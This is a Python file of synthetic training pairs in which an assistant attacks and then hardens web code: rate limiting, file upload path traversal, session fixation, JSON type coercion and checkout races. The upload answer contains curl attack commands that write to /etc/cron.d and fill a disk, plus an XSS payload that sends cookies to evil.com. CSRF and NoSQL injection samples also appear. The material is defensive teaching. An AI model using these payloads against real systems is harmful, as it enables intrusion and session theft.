"""Phase 2B: Advanced Reasoning — Adversarial Self-Testing (Part 4/6)
Write solution, systematically attack it, fix what breaks:
rate limiting bypass, file path traversal, session fixation, input coercion, race in checkout."""

PAIRS = [
    (
        "thinking/adversarial-ratelimit-bypass",
        "I implemented rate limiting for my API using the client's IP address. Is this sufficient?",
        r'''<think>
Let me write the obvious IP-based rate limiter first, then systematically attack it.

The initial implementation:
```python
from collections import defaultdict
import time

rate_limits = defaultdict(list)  # ip -> [timestamps]

def check_rate_limit(ip: str, max_requests: int = 100, window: int = 60) -> bool:
    now = time.time()
    rate_limits[ip] = [t for t in rate_limits[ip] if now - t < window]
    if len(rate_limits[ip]) >= max_requests:
        return False
    rate_limits[ip].append(now)
    return True
```

Now let me attack this from every angle:

Attack 1: IP spoofing via headers
- Many apps trust X-Forwarded-For, X-Real-IP headers
- Attacker sends: `X-Forwarded-For: 1.2.3.4` (different fake IP each request)
- If the app reads IP from this header, rate limiting is completely bypassed
- Fix: Only trust X-Forwarded-For from known proxy IPs, or use the direct connection IP

Attack 2: Distributed attack
- Attacker uses a botnet or rotating proxy service (thousands of IPs)
- Each IP stays under the limit, but collectively they overwhelm the service
- Fix: Rate limit by user account (after auth), not just IP. Also add global rate limits.

Attack 3: IPv6 rotation
- Cloud providers give /64 blocks = 2^64 addresses per customer
- Attacker rotates through millions of IPv6 addresses
- Fix: Rate limit by /64 subnet for IPv6, not individual addresses

Attack 4: Memory exhaustion
- The `rate_limits` dict grows unbounded as new IPs arrive
- Attacker sends requests from millions of IPs (or spoofed IPs)
- Dict consumes all memory, app crashes
- Fix: Use Redis with TTL (auto-expires), or bounded LRU cache

Attack 5: Race condition
- Two requests from same IP arrive simultaneously
- Both read count as 99 (under limit), both proceed, both increment to 100
- Actual: 101 requests allowed
- Fix: Use atomic operations (Redis INCR, not read-then-write)

Attack 6: Time window gaming
- Window is 60 seconds sliding
- Attacker sends 100 requests at second 59, then 100 more at second 61
- They get 200 requests in 2 seconds while "respecting" the per-minute limit
- Fix: Use sliding window log or sliding window counter, not fixed windows

Attack 7: API key reuse
- If rate limit is per-API-key, attacker creates multiple free accounts
- Each key gets its own limit
- Fix: Rate limit by IP AND by key. Also limit account creation rate.

Attack 8: Targeting specific endpoints
- Rate limit is global (100 req/min total), but /login endpoint should be much stricter
- Attacker sends 100 login attempts per minute = brute force
- Fix: Per-endpoint rate limits, especially strict on auth endpoints

That's 8 bypasses. Let me build a proper solution.
</think>

IP-based rate limiting has at least 8 bypass vectors. Let me attack your implementation and build a proper one.

**Bypasses I found:**

| Attack | How | Severity |
|--------|-----|----------|
| Header spoofing | Fake X-Forwarded-For | Critical |
| Distributed IPs | Botnet/proxy rotation | High |
| IPv6 rotation | /64 block gives billions of IPs | High |
| Memory exhaustion | Millions of unique IPs crash the dict | High |
| Race condition | Concurrent requests bypass count | Medium |
| Window boundary | Burst at window edges | Medium |
| Account farming | Multiple API keys | Medium |
| Endpoint targeting | Global limit, no per-route limits | Medium |

**Proper implementation:**

```python
import redis
import hashlib
from ipaddress import ip_address, ip_network

r = redis.Redis()

def get_real_ip(request) -> str:
    """Extract real IP — NEVER trust X-Forwarded-For blindly."""
    # Only trust the header if request came through YOUR load balancer
    trusted_proxies = {"10.0.0.1", "10.0.0.2"}  # Your LB IPs
    direct_ip = request.client.host

    if direct_ip in trusted_proxies:
        # Take the rightmost untrusted IP from the chain
        forwarded = request.headers.get("X-Forwarded-For", "")
        ips = [ip.strip() for ip in forwarded.split(",")]
        for ip in reversed(ips):
            if ip not in trusted_proxies:
                return ip
    return direct_ip

def normalize_ip(ip_str: str) -> str:
    """Normalize IPv6 to /64 subnet to prevent rotation attacks."""
    ip = ip_address(ip_str)
    if ip.version == 6:
        # Rate limit by /64 subnet
        network = ip_network(f"{ip}/64", strict=False)
        return str(network.network_address)
    return ip_str

def check_rate_limit(
    key: str,
    max_requests: int,
    window_seconds: int,
) -> tuple[bool, dict]:
    """Atomic sliding window rate limit using Redis."""
    import time
    now = time.time()
    pipe = r.pipeline()

    # Sliding window log (atomic via pipeline)
    pipe.zremrangebyscore(key, 0, now - window_seconds)  # Remove old entries
    pipe.zadd(key, {f"{now}": now})                       # Add current request
    pipe.zcard(key)                                        # Count in window
    pipe.expire(key, window_seconds + 1)                   # Auto-cleanup (prevents memory leak)
    _, _, count, _ = pipe.execute()

    allowed = count <= max_requests
    return allowed, {
        "remaining": max(0, max_requests - count),
        "reset": int(now + window_seconds),
        "limit": max_requests,
    }

# Multi-layer rate limiting
def rate_limit_request(request, user=None) -> tuple[bool, dict]:
    ip = normalize_ip(get_real_ip(request))
    endpoint = request.url.path

    # Layer 1: Global IP limit (broad protection)
    ok, info = check_rate_limit(f"rl:ip:{ip}", max_requests=200, window_seconds=60)
    if not ok:
        return False, info

    # Layer 2: Per-endpoint limits (strict on sensitive routes)
    endpoint_limits = {
        "/auth/login": (5, 60),       # 5 per minute (brute force protection)
        "/auth/register": (3, 3600),  # 3 per hour (account farming)
        "/api/search": (30, 60),      # 30 per minute (expensive query)
    }
    if endpoint in endpoint_limits:
        max_req, window = endpoint_limits[endpoint]
        ok, info = check_rate_limit(f"rl:ip:{ip}:{endpoint}", max_req, window)
        if not ok:
            return False, info

    # Layer 3: Per-user limit (if authenticated)
    if user:
        ok, info = check_rate_limit(f"rl:user:{user.id}", max_requests=1000, window_seconds=60)
        if not ok:
            return False, info

    return True, info
```

**As FastAPI middleware:**

```python
from fastapi import Request
from fastapi.responses import JSONResponse

@app.middleware("http")
async def rate_limit_middleware(request: Request, call_next):
    user = get_current_user_or_none(request)  # Don't fail if not authed
    allowed, info = rate_limit_request(request, user)

    if not allowed:
        return JSONResponse(
            status_code=429,
            content={"error": "RATE_LIMITED", "message": "Too many requests"},
            headers={
                "Retry-After": str(info["reset"] - int(time.time())),
                "X-RateLimit-Limit": str(info["limit"]),
                "X-RateLimit-Remaining": str(info["remaining"]),
            },
        )

    response = await call_next(request)
    response.headers["X-RateLimit-Remaining"] = str(info["remaining"])
    return response
```

Key points: never trust client headers for IP, normalize IPv6 to /64, use Redis atomic operations, layer IP + endpoint + user limits, and set TTL on all Redis keys.'''
    ),
    (
        "thinking/adversarial-pathtraversal-upload",
        "I have a file upload endpoint that saves files to a directory. Users provide the filename. Here's my code:\n\n```python\n@app.post('/upload')\nasync def upload(file: UploadFile):\n    path = f'/uploads/{file.filename}'\n    with open(path, 'wb') as f:\n        f.write(await file.read())\n    return {'path': path}\n```\n\nIs this safe?",
        r'''<think>
Let me systematically attack this upload endpoint.

The code: saves to `/uploads/{user_provided_filename}`.

Attack 1: Path traversal
- Filename: `../../../etc/cron.d/evil`
- Resolves to: `/uploads/../../../etc/cron.d/evil` = `/etc/cron.d/evil`
- Attacker writes a cron job that runs arbitrary commands
- Severity: CRITICAL — remote code execution

Attack 2: Overwrite existing files
- Filename: `index.html` (if /uploads is web-served)
- Attacker replaces the landing page with phishing content
- Or: filename matches another user's file → data loss
- Severity: HIGH

Attack 3: Null byte injection (older systems)
- Filename: `evil.php%00.jpg`
- Some systems truncate at null byte: saved as `evil.php`
- Python 3 handles this, but worth noting
- Severity: LOW (on modern Python)

Attack 4: Special filenames
- Windows: `CON`, `PRN`, `AUX`, `NUL`, `COM1` — reserved device names
- Can cause hangs or errors on Windows systems
- Filename: `.htaccess` — could change Apache config if served
- Filename: `__init__.py` — if uploads dir is on Python path
- Severity: MEDIUM

Attack 5: Filename length
- Some filesystems have 255-byte name limits
- Extremely long filename could cause errors
- Severity: LOW

Attack 6: File content attacks
- Upload a .html file with JavaScript → stored XSS when served
- Upload a .svg file with embedded script → XSS
- Upload a polyglot file (valid JPEG AND valid HTML)
- Severity: HIGH (if files are served to other users)

Attack 7: Resource exhaustion
- Upload a 10GB file — fills disk
- Upload thousands of small files — fills inodes
- Severity: MEDIUM

Attack 8: Symlink/hardlink tricks
- If /uploads already has a symlink `important -> /etc/passwd`
- Overwriting `important` overwrites /etc/passwd
- Severity: MEDIUM (requires existing symlink)

The code has at minimum 3 critical/high vulnerabilities. Let me fix all of them.
</think>

**This code has critical vulnerabilities.** Let me attack it and show you a secure version.

**Attacks that work:**

```
# Attack 1: Path traversal — write anywhere on the filesystem
curl -F "file=@evil.sh;filename=../../../etc/cron.d/pwned" http://yourapp/upload
# Writes to /etc/cron.d/pwned → remote code execution

# Attack 2: Overwrite other users' files
curl -F "file=@fake.html;filename=index.html" http://yourapp/upload

# Attack 3: Stored XSS (if files are served)
curl -F "file=@xss.html;filename=evil.html" http://yourapp/upload
# evil.html contains: <script>document.location='http://evil.com/?c='+document.cookie</script>

# Attack 4: Disk exhaustion
curl -F "file=@/dev/zero;filename=huge.bin" http://yourapp/upload
# Fills the entire disk
```

**Secure implementation:**

```python
import uuid
import os
import magic  # python-magic for content-type detection
from pathlib import Path

UPLOAD_DIR = Path("/uploads")
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".pdf", ".txt", ".csv"}
ALLOWED_MIMETYPES = {
    "image/jpeg", "image/png", "image/gif",
    "application/pdf", "text/plain", "text/csv",
}

def sanitize_filename(original: str) -> str:
    """Generate safe filename — NEVER use user-provided name directly."""
    # Extract and validate extension
    _, ext = os.path.splitext(original)
    ext = ext.lower()

    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"File type {ext} not allowed")

    # Generate random filename — eliminates ALL path traversal
    safe_name = f"{uuid.uuid4().hex}{ext}"
    return safe_name

def validate_content(file_bytes: bytes, expected_ext: str) -> bool:
    """Verify file content matches extension — prevents disguised files."""
    detected = magic.from_buffer(file_bytes[:2048], mime=True)
    if detected not in ALLOWED_MIMETYPES:
        return False

    # Ensure extension matches content (no .jpg that's actually HTML)
    ext_to_mime = {
        ".jpg": {"image/jpeg"}, ".jpeg": {"image/jpeg"},
        ".png": {"image/png"}, ".gif": {"image/gif"},
        ".pdf": {"application/pdf"},
        ".txt": {"text/plain"}, ".csv": {"text/plain", "text/csv"},
    }
    expected_mimes = ext_to_mime.get(expected_ext, set())
    return detected in expected_mimes

@app.post("/upload")
async def upload(
    file: UploadFile,
    user: User = Depends(get_current_user),  # Auth required
):
    # 1. Read with size limit (prevents disk exhaustion)
    chunks = []
    total_size = 0
    while chunk := await file.read(8192):
        total_size += len(chunk)
        if total_size > MAX_FILE_SIZE:
            raise HTTPException(413, "File too large")
        chunks.append(chunk)
    content = b"".join(chunks)

    # 2. Sanitize filename (prevents path traversal)
    safe_name = sanitize_filename(file.filename)

    # 3. Validate content matches extension (prevents disguised files)
    _, ext = os.path.splitext(safe_name)
    if not validate_content(content, ext):
        raise HTTPException(
            422, "File content doesn't match extension"
        )

    # 4. Write to isolated directory (belt + suspenders)
    dest = UPLOAD_DIR / safe_name
    # Verify the resolved path is still inside UPLOAD_DIR
    if not dest.resolve().is_relative_to(UPLOAD_DIR.resolve()):
        raise HTTPException(400, "Invalid filename")

    dest.write_bytes(content)

    # 5. Store metadata in DB (track who uploaded what)
    upload_record = db.create_upload(
        user_id=user.id,
        original_name=file.filename,  # Keep original for display
        stored_name=safe_name,        # Use safe name for retrieval
        size=total_size,
        content_type=file.content_type,
    )

    return {"upload_id": upload_record.id, "filename": file.filename}
```

**Serve files safely (prevent XSS from uploaded content):**

```python
@app.get("/files/{upload_id}")
async def download(upload_id: int, user: User = Depends(get_current_user)):
    record = db.get_upload(upload_id)
    if not record or record.user_id != user.id:
        raise HTTPException(404)

    path = UPLOAD_DIR / record.stored_name

    return FileResponse(
        path,
        filename=record.original_name,
        # Force download — NEVER render in browser
        headers={"Content-Disposition": f"attachment; filename=\"{record.original_name}\""},
        # Prevent browser from sniffing content type
        media_type="application/octet-stream",
    )
```

The critical fix: **never use user-provided filenames in paths**. Generate a UUID, validate content type by reading file bytes, limit size during upload, and force downloads instead of inline rendering.'''
    ),
    (
        "thinking/adversarial-session-fixation",
        "I'm implementing session management for my web app. After login, I store the user ID in the session. What could go wrong?",
        r'''<think>
Let me think about session management and systematically attack it.

Basic implementation they likely have:
```python
@app.post("/login")
def login(username, password):
    user = authenticate(username, password)
    if user:
        session["user_id"] = user.id
        return redirect("/dashboard")
```

Let me attack this from every angle:

Attack 1: Session fixation
- Attacker visits the site, gets session ID: abc123
- Attacker sends victim a link: https://yourapp.com/?sessionid=abc123
- Victim clicks, logs in → session abc123 now has victim's user_id
- Attacker already has session abc123 → attacker is now logged in as victim
- Fix: REGENERATE session ID after login

Attack 2: Session hijacking via XSS
- If there's any XSS vulnerability, attacker can read document.cookie
- Gets the session cookie, replays it
- Fix: Set HttpOnly flag on cookie (JavaScript can't read it)

Attack 3: Session hijacking via network sniffing
- If ANY page is served over HTTP (not HTTPS), cookie is sent in cleartext
- Attacker on same WiFi can sniff it (Firesheep attack)
- Fix: Set Secure flag (only sent over HTTPS) + HSTS header

Attack 4: CSRF (Cross-Site Request Forgery)
- Victim is logged in on your site
- Victim visits evil.com which has: <img src="https://yourapp.com/transfer?to=attacker&amount=1000">
- Browser sends session cookie automatically → transfer executes
- Fix: CSRF tokens, SameSite cookie attribute

Attack 5: Session doesn't expire
- User logs in on a public computer, forgets to log out
- Session stays valid forever → next person can use it
- Fix: Set expiration (e.g., 30 min idle, 24h max)

Attack 6: Predictable session IDs
- If session ID is sequential (1, 2, 3...) or timestamp-based
- Attacker can guess other users' session IDs
- Fix: Use cryptographically random session IDs (128+ bits)

Attack 7: Session stored client-side without integrity
- If using JWT or signed cookies, what's the algorithm?
- alg=none attack: change JWT header to {"alg": "none"}, strip signature
- Fix: Always validate algorithm server-side, never accept "none"

Attack 8: Insufficient session invalidation
- User changes password → old sessions should be invalidated
- User is deactivated by admin → session should stop working
- Fix: Validate session against DB on each request, or use short-lived tokens

Attack 9: Concurrent session abuse
- Attacker steals session ID → both attacker and victim use it simultaneously
- No way to detect or prevent
- Fix: Bind session to fingerprint (IP + User-Agent), detect anomalies

That's 9 attack vectors. The MOST CRITICAL is session fixation — it's the easiest to exploit and the easiest to fix.
</think>

Session management has at least 9 attack vectors. The most critical one most developers miss: **session fixation**. Let me walk through all of them.

**Attack 1 — Session fixation (CRITICAL):**

```
1. Attacker visits your site → gets session ID "abc123"
2. Attacker emails victim: "Click here: https://yourapp.com/login?sid=abc123"
3. Victim logs in → session "abc123" now contains victim's user_id
4. Attacker still has "abc123" → attacker IS the victim
```

**Fix: Regenerate session ID on login:**

```python
@app.post("/login")
def login(request, username: str, password: str):
    user = authenticate(username, password)
    if not user:
        raise HTTPException(401, "Invalid credentials")

    # CRITICAL: Create a new session ID after authentication
    # Old session ID is invalidated
    request.session.clear()
    request.session.regenerate()  # New ID — fixation impossible

    request.session["user_id"] = user.id
    request.session["login_time"] = time.time()
    request.session["ip"] = request.client.host
    return redirect("/dashboard")
```

**Full secure session configuration:**

```python
# FastAPI with Starlette sessions (or use itsdangerous for signed cookies)
from starlette.middleware.sessions import SessionMiddleware

app.add_middleware(
    SessionMiddleware,
    secret_key=os.environ["SESSION_SECRET"],  # 256-bit random key
    session_cookie="session",
    max_age=3600,           # 1 hour max lifetime
    same_site="lax",        # Attack 4: CSRF protection
    https_only=True,        # Attack 3: Only sent over HTTPS
    httponly=True,           # Attack 2: JavaScript can't read it
)
```

**Attack-by-attack defenses:**

```python
# Attack 5: Session expiration
SESSION_IDLE_TIMEOUT = 1800   # 30 min idle
SESSION_MAX_LIFETIME = 86400  # 24h absolute max

@app.middleware("http")
async def session_timeout(request: Request, call_next):
    if "user_id" in request.session:
        now = time.time()
        last_active = request.session.get("last_active", 0)
        login_time = request.session.get("login_time", 0)

        # Idle timeout
        if now - last_active > SESSION_IDLE_TIMEOUT:
            request.session.clear()
            return RedirectResponse("/login?reason=idle")

        # Absolute timeout
        if now - login_time > SESSION_MAX_LIFETIME:
            request.session.clear()
            return RedirectResponse("/login?reason=expired")

        request.session["last_active"] = now

    return await call_next(request)

# Attack 8: Invalidate on password change
@app.post("/change-password")
def change_password(request, old_password: str, new_password: str):
    user = get_current_user(request)
    if not verify_password(old_password, user.hashed_password):
        raise HTTPException(400, "Wrong current password")

    user.hashed_password = hash_password(new_password)
    user.session_invalidated_at = datetime.utcnow()  # Store in DB
    db.save(user)

    # Kill ALL other sessions for this user
    session_store.delete_all_for_user(user.id, except_current=request.session.id)

    return {"message": "Password changed, other sessions logged out"}

# Attack 9: Detect session theft
@app.middleware("http")
async def session_binding(request: Request, call_next):
    if "user_id" in request.session:
        stored_ip = request.session.get("ip")
        current_ip = request.client.host

        if stored_ip and stored_ip != current_ip:
            # IP changed — could be legitimate (mobile) or theft
            # Log and optionally require re-authentication
            logger.warning("session_ip_change",
                user_id=request.session["user_id"],
                old_ip=stored_ip, new_ip=current_ip)

    return await call_next(request)
```

**Cookie flags checklist:**

| Flag | Purpose | Set it? |
|------|---------|---------|
| HttpOnly | Blocks JavaScript access | Always |
| Secure | HTTPS only | Always in production |
| SameSite=Lax | Blocks CSRF from other sites | Always |
| Max-Age | Auto-expire cookie | Always |
| Path=/ | Scope to your app | Usually |
| Domain | Scope to your domain | Don't set (defaults to exact match) |

The #1 fix: regenerate session ID after login. Everything else is defense-in-depth.'''
    ),
    (
        "thinking/adversarial-type-coercion",
        "I'm building a REST API with Flask. My endpoint takes a JSON body with an 'amount' field that should be a number. I do `amount = request.json['amount']`. What can go wrong?",
        r'''<think>
Let me think about what can be sent as JSON for the "amount" field and what breaks.

The code: `amount = request.json['amount']`

JSON types that could be sent: number, string, boolean, null, array, object

Attack 1: String instead of number
```json
{"amount": "100"}
```
- Python: amount is "100" (string)
- If later: `total = amount * quantity` → "100100100" (string repetition, not multiplication)
- If stored to DB: might work (implicit cast) or might corrupt data
- If compared: `"100" > "9"` is False in Python (string comparison)

Attack 2: Boolean
```json
{"amount": true}
```
- Python: amount is True
- `True * 5` = 5 in Python (bool is subclass of int)
- `True + 100` = 101
- Attacker pays 1 instead of actual price

Attack 3: Null
```json
{"amount": null}
```
- Python: amount is None
- `None * 5` → TypeError crash → 500 error → information disclosure in error message

Attack 4: Negative number
```json
{"amount": -100}
```
- If this is a payment: negative payment = refund to attacker
- `total = amount * quantity` → negative total → money goes wrong direction

Attack 5: Extremely large number
```json
{"amount": 99999999999999999999}
```
- Python handles arbitrary precision integers
- But if stored in a DB INTEGER column: overflow or truncation
- If used in financial calculation: could cause integer overflow in other languages

Attack 6: Float precision
```json
{"amount": 0.1}
```
- Python: 0.1 is actually 0.1000000000000000055511151231257827021181583404541015625
- `0.1 + 0.2 == 0.3` → False
- Financial calculations with floats = rounding errors = money discrepancies

Attack 7: Nested object
```json
{"amount": {"$gt": 0}}
```
- If this reaches a MongoDB query: NoSQL injection!
- `db.orders.find({"amount": {"$gt": 0}})` → returns all orders
- Python: amount is a dict, arithmetic operations will crash

Attack 8: Array
```json
{"amount": [100, 200]}
```
- Python: amount is [100, 200]
- Unexpected type in all subsequent operations

Attack 9: Scientific notation edge case
```json
{"amount": 1e308}
```
- Python: float('inf') adjacent — could overflow calculations
- Or: `{"amount": 1e-300}` — effectively zero, might bypass "amount > 0" check due to float comparison

Attack 10: Missing field entirely
```json
{}
```
- `request.json['amount']` → KeyError → 500 crash

The fundamental problem: trusting user input without validation. EVERY field from a request body must be validated for type, range, and format before use.
</think>

`request.json['amount']` trusts the client completely. JSON allows 6 types for any field. Let me show you every attack.

**What attackers can send:**

```python
# All of these are valid JSON for "amount":
{"amount": "100"}           # String — silent wrong math
{"amount": true}            # Boolean — True == 1 in Python
{"amount": null}            # None — crashes on arithmetic
{"amount": -100}            # Negative — reverses money flow
{"amount": 0.1}             # Float — precision errors in finance
{"amount": {"$gt": 0}}      # Object — NoSQL injection
{"amount": [1, 2]}          # Array — type error
{"amount": 1e308}           # Near-infinity
{}                          # Missing — KeyError crash
```

**Worst-case scenarios:**

```python
# Attack: boolean coercion
amount = True  # From JSON
total = amount * quantity  # True * 5 = 5 (pays $5 instead of $500)

# Attack: negative amount
amount = -100
charge_customer(amount)  # Charges -$100 = refund $100 to attacker

# Attack: string
amount = "100"
if amount > 50:  # TypeError in Python 3, wrong result in Python 2
    apply_discount()

# Attack: NoSQL injection (if using MongoDB)
amount = {"$gt": 0}
db.orders.find({"amount": amount})  # Returns ALL orders!
```

**The fix — validate with Pydantic:**

```python
from pydantic import BaseModel, Field
from decimal import Decimal

class PaymentRequest(BaseModel):
    amount: Decimal = Field(
        gt=0,            # Must be positive (no negative payments)
        le=999999,       # Reasonable maximum
        decimal_places=2, # Cents precision, no 0.001
        description="Payment amount in dollars"
    )
    currency: str = Field(pattern=r'^[A-Z]{3}$')  # ISO 4217

@app.post("/payment")
def create_payment(request):
    # Pydantic validates EVERYTHING:
    # - Type: must be numeric (rejects strings, bools, objects, arrays, null)
    # - Range: 0 < amount <= 999999
    # - Precision: max 2 decimal places
    data = PaymentRequest.model_validate(request.json)

    # data.amount is now a guaranteed Decimal > 0
    # Safe to use in calculations
    process_payment(data.amount, data.currency)
```

**Or with Flask-specific approach:**

```python
from marshmallow import Schema, fields, validate

class PaymentSchema(Schema):
    amount = fields.Decimal(
        required=True,
        validate=[
            validate.Range(min=0.01, max=999999.99),
        ],
    )

@app.post("/payment")
def create_payment():
    schema = PaymentSchema()
    data = schema.load(request.json)  # Raises ValidationError if invalid
    # data["amount"] is a validated Decimal
```

**For financial calculations, ALWAYS use Decimal:**

```python
from decimal import Decimal, ROUND_HALF_UP

# WRONG — float arithmetic
price = 0.1 + 0.2  # 0.30000000000000004

# RIGHT — Decimal arithmetic
price = Decimal("0.10") + Decimal("0.20")  # Decimal('0.30')

# Round to cents
total = (subtotal * tax_rate).quantize(
    Decimal("0.01"), rounding=ROUND_HALF_UP
)
```

Rule: **never use `request.json[field]` directly**. Always validate type, range, and format before any business logic touches the data.'''
    ),
    (
        "thinking/adversarial-checkout-race",
        "Users are reporting they sometimes get charged twice for the same order. Our checkout flow: 1) check inventory, 2) create order, 3) charge payment, 4) reduce inventory. How do I fix this?",
        r'''<think>
Let me analyze this checkout flow for race conditions and other concurrency bugs.

The flow:
1. Check inventory (SELECT stock FROM products WHERE id = X)
2. Create order (INSERT INTO orders ...)
3. Charge payment (call Stripe API)
4. Reduce inventory (UPDATE products SET stock = stock - 1)

Let me simulate concurrent requests:

Race Condition 1: Double purchase (TOCTOU on inventory)
- Request A: checks stock = 1 ✓
- Request B: checks stock = 1 ✓ (hasn't been reduced yet)
- Request A: creates order, charges, reduces stock to 0
- Request B: creates order, charges, reduces stock to -1
- Result: 2 orders for 1 item, stock is -1

Race Condition 2: Double charge (user double-clicks)
- User clicks "Pay" twice quickly
- Two identical requests hit the server
- Both pass inventory check
- Both charge the payment method
- Both create orders
- Result: User charged twice

Race Condition 3: Partial failure
- Step 1: inventory check ✓
- Step 2: order created ✓
- Step 3: payment charged ✓
- Step 4: inventory update FAILS (DB timeout)
- Result: Customer charged but inventory not decremented
- Worse: if step 3 fails AFTER step 2, we have an order with no payment

Race Condition 4: Payment callback race
- If using async payment (webhooks):
- Order created → payment initiated → user navigates away
- Webhook arrives but order status already changed by timeout job
- Result: Payment received but order cancelled

The fundamental problems:
1. No atomicity — steps 1-4 are not a single transaction
2. No idempotency — same request can execute twice
3. Wrong order — inventory should be reserved BEFORE payment, not after

Let me design the fix.

The correct flow:
1. Reserve inventory (atomic decrement with check: UPDATE ... WHERE stock > 0)
2. Create order (status: pending_payment)
3. Charge payment (with idempotency key)
4. If payment succeeds: confirm order (status: paid)
5. If payment fails: release inventory reservation

Idempotency for double-click: use a client-generated idempotency key.
If we see the same key twice, return the first result instead of re-executing.
</think>

You have at least 3 race conditions in this flow. The core issues: no atomicity, no idempotency, and wrong operation order.

**The races happening:**

```
Timeline (two concurrent checkouts for last item):

Request A:  [check: stock=1 ✓] → [create order] → [charge $50] → [stock=0]
Request B:        [check: stock=1 ✓] → [create order] → [charge $50] → [stock=-1]

Result: 2 charges, 2 orders, stock = -1
```

**Fix 1 — Atomic inventory reservation (eliminates overselling):**

```sql
-- WRONG: Check then act (TOCTOU race)
SELECT stock FROM products WHERE id = 42;  -- stock = 1
-- Another request can read stock = 1 here!
UPDATE products SET stock = stock - 1 WHERE id = 42;

-- RIGHT: Atomic reserve (check and act in one statement)
UPDATE products
SET stock = stock - 1
WHERE id = 42 AND stock > 0
RETURNING stock;
-- If no row returned → item is out of stock (no race possible)
```

```python
def reserve_inventory(product_id: int, quantity: int) -> bool:
    """Atomically reserve stock. Returns False if insufficient."""
    result = db.execute(
        text("""
            UPDATE products
            SET stock = stock - :qty
            WHERE id = :pid AND stock >= :qty
            RETURNING id
        """),
        {"pid": product_id, "qty": quantity},
    )
    return result.rowcount > 0
```

**Fix 2 — Idempotency key (eliminates double-charge):**

```python
import hashlib
from datetime import datetime, timedelta

@app.post("/checkout")
async def checkout(
    request: CheckoutRequest,
    idempotency_key: str = Header(..., alias="Idempotency-Key"),
    user: User = Depends(get_current_user),
):
    # Check if we've seen this key before
    existing = db.get_order_by_idempotency_key(idempotency_key, user.id)
    if existing:
        # Return the same result — no re-execution
        return {"order_id": existing.id, "status": existing.status}

    # Proceed with new checkout...
```

```javascript
// Frontend: generate idempotency key, disable button
const checkoutBtn = document.getElementById('checkout-btn');
checkoutBtn.addEventListener('click', async () => {
    checkoutBtn.disabled = true; // Prevent double-click

    const idempotencyKey = crypto.randomUUID(); // Unique per attempt
    const response = await fetch('/checkout', {
        method: 'POST',
        headers: {
            'Idempotency-Key': idempotencyKey,
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(cart),
    });

    if (!response.ok) checkoutBtn.disabled = false; // Re-enable on failure
});
```

**Fix 3 — Correct order with compensation (handles partial failure):**

```python
async def checkout(user_id: int, cart: Cart, idempotency_key: str):
    """
    Correct order:
    1. Reserve inventory (atomic)
    2. Create order (pending)
    3. Charge payment (with idempotency)
    4. Confirm order — OR — rollback everything
    """

    # Step 1: Reserve inventory FIRST
    reserved_items = []
    try:
        for item in cart.items:
            if not reserve_inventory(item.product_id, item.quantity):
                # Rollback already-reserved items
                for r in reserved_items:
                    release_inventory(r.product_id, r.quantity)
                raise OutOfStockError(item.product_id)
            reserved_items.append(item)

        # Step 2: Create order in "pending" state
        order = db.create_order(
            user_id=user_id,
            items=cart.items,
            status="pending_payment",
            idempotency_key=idempotency_key,
        )
        db.commit()

        # Step 3: Charge payment (Stripe idempotency key prevents double-charge)
        try:
            payment = stripe.PaymentIntent.create(
                amount=int(order.total * 100),
                currency="usd",
                customer=user.stripe_customer_id,
                idempotency_key=f"order-{order.id}",  # Stripe deduplicates
                metadata={"order_id": str(order.id)},
            )
        except stripe.error.CardError as e:
            # Payment failed → rollback inventory + mark order failed
            order.status = "payment_failed"
            for item in reserved_items:
                release_inventory(item.product_id, item.quantity)
            db.commit()
            raise PaymentError(str(e))

        # Step 4: Confirm order
        order.status = "paid"
        order.payment_id = payment.id
        db.commit()

        return order

    except Exception:
        # Any unexpected error → release all reservations
        for item in reserved_items:
            release_inventory(item.product_id, item.quantity)
        db.rollback()
        raise
```

**Summary of fixes:**

| Problem | Fix |
|---------|-----|
| Overselling | Atomic `UPDATE ... WHERE stock >= qty` |
| Double charge | Idempotency key (client + Stripe) |
| Partial failure | Reserve first, compensate on failure |
| Double-click | Disable button + idempotency key |
| Wrong order | Reserve → Order → Pay → Confirm (not Check → Order → Pay → Reserve) |

The key insight: **reserve inventory atomically before payment, not after**. If payment fails, release the reservation. This way you never oversell and never charge without inventory.'''
    ),
]

if __name__ == "__main__":
    for tag, q, a in PAIRS:
        print(f"  [{tag}] {q[:60]}...")
    print(f"\nTotal pairs in this file: {len(PAIRS)}")
